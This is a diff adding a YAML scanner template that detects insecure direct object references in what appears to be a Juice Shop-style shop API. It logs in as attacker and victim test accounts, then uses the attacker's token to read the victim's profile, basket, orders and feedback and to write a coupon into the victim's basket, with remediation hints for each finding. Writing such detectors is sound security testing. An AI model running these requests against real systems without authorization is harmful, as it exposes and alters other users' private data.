@@ -1,0 +1,175 @@
+id: idor-diff-matcher
+info:
+  name: IDOR Detection via Response Diff Analysis
+  description: |
+    Detects Insecure Direct Object Reference vulnerabilities by comparing
+    responses between different user contexts. Uses DiffMatcher to identify
+    when an attacker can access victim's data.
+  severity: high
+  owasp_category: A01_BROKEN_ACCESS_CONTROL
+  tags:
+    - idor
+    - diff-matcher
+    - access-control
+    - horizontal-privilege-escalation
+
+variables:
+  base_url: "{{BASE_URL}}"
+  attacker_email: "{{ATTACKER_EMAIL|attacker@test.com}}"
+  attacker_password: "{{ATTACKER_PASSWORD|password123}}"
+  victim_email: "{{VICTIM_EMAIL|victim@test.com}}"
+  victim_password: "{{VICTIM_PASSWORD|password123}}"
+
+requests:
+  # Step 1: Login as attacker to get baseline token
+  - name: Attacker login
+    method: POST
+    path: /rest/user/login
+    headers:
+      Content-Type: application/json
+    body: '{"email": "{{attacker_email}}", "password": "{{attacker_password}}"}'
+    extractors:
+      - type: json
+        name: attacker_token
+        selector: "$.authentication.token"
+        internal: true
+      - type: json
+        name: attacker_id
+        selector: "$.user.id"
+        internal: true
+    on_match:
+      cache_key: attacker_response
+      store_baseline: true
+
+  # Step 2: Login as victim to get their data
+  - name: Victim login
+    method: POST
+    path: /rest/user/login
+    headers:
+      Content-Type: application/json
+    body: '{"email": "{{victim_email}}", "password": "{{victim_password}}"}'
+    extractors:
+      - type: json
+        name: victim_id
+        selector: "$.user.id"
+        internal: true
+      - type: json
+        name: victim_token
+        selector: "$.authentication.token"
+        internal: true
+
+  # Step 3: Access victim's data with attacker's token (IDOR test)
+  - name: Access victim profile as attacker
+    method: GET
+    path: /api/Users/{{victim_id}}
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+    matchers:
+      # DiffMatcher: compare with baseline to detect unauthorized access
+      - type: diff
+        selector: "$.data.id"
+        diff_condition: same
+        negative: false
+      - type: status
+        values: [200]
+    on_match:
+      vulnerability: IDOR_USER_PROFILE
+      message: "Attacker can access victim's user profile (ID: {{victim_id}})"
+      remediation: "Implement strict ownership checks: verify request.user.id == resource.user.id"
+
+  # Step 4: Test accessing victim's basket
+  - name: Access victim basket as attacker
+    method: GET
+    path: /api/Baskets/{{victim_id}}
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+    matchers:
+      - type: diff
+        selector: "$.data.id"
+        diff_condition: same
+        negative: false
+      - type: json
+        selector: "$.data"
+        condition: exists
+    on_match:
+      vulnerability: IDOR_BASKET
+      message: "Attacker can access victim's basket data"
+      remediation: "Add authorization check to basket endpoint"
+
+  # Step 5: Test sequential ID access (common IDOR pattern)
+  - name: Sequential ID enumeration
+    method: GET
+    path: /api/Users/{{victim_id}}
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+    matchers:
+      # Check if we can see victim's email (data leak)
+      - type: word
+        words: ["email", "username", "password"]
+        part: body
+        condition: or
+      - type: json
+        selector: "$.data.email"
+        condition: exists
+    on_match:
+      vulnerability: IDOR_DATA_LEAK
+      message: "User data leaked via sequential ID access"
+      remediation: "Use random UUIDs instead of sequential IDs and enforce authorization"
+
+  # Step 6: Test modifying victim's resources
+  - name: Modify victim basket as attacker
+    method: PUT
+    path: /api/Baskets/{{victim_id}}
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      Content-Type: application/json
+    body: '{"coupon": "FREE_MONEY"}'
+    matchers:
+      - type: status
+        values: [200, 201, 204]
+      - type: diff
+        selector: "$.data.coupon"
+        diff_condition: same
+        negative: false
+    on_match:
+      vulnerability: IDOR_WRITE_ACCESS
+      message: "Attacker can modify victim's basket data"
+      remediation: "Implement write-access authorization checks"
+
+  # Step 7: Test order access (payment data)
+  - name: Access victim orders as attacker
+    method: GET
+    path: /api/Orders?userId={{victim_id}}
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+    matchers:
+      - type: status
+        values: [200]
+      - type: json
+        selector: "$.data"
+        condition: exists
+      - type: diff
+        selector: "$.data.0.userId"
+        diff_condition: same
+        negative: false
+    on_match:
+      vulnerability: IDOR_ORDER_HISTORY
+      message: "Attacker can view victim's order history"
+      remediation: "Filter orders by current user, not by query parameter"
+
+  # Step 8: Test feedback IDOR
+  - name: Access victim feedback as attacker
+    method: GET
+    path: /api/Feedback/{{victim_id}}
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+    matchers:
+      - type: status
+        values: [200]
+      - type: json
+        selector: "$.data"
+        condition: exists
+    on_match:
+      vulnerability: IDOR_FEEDBACK
+      message: "Attacker can access victim's feedback data"
+      remediation: "Implement proper authorization on feedback endpoints"
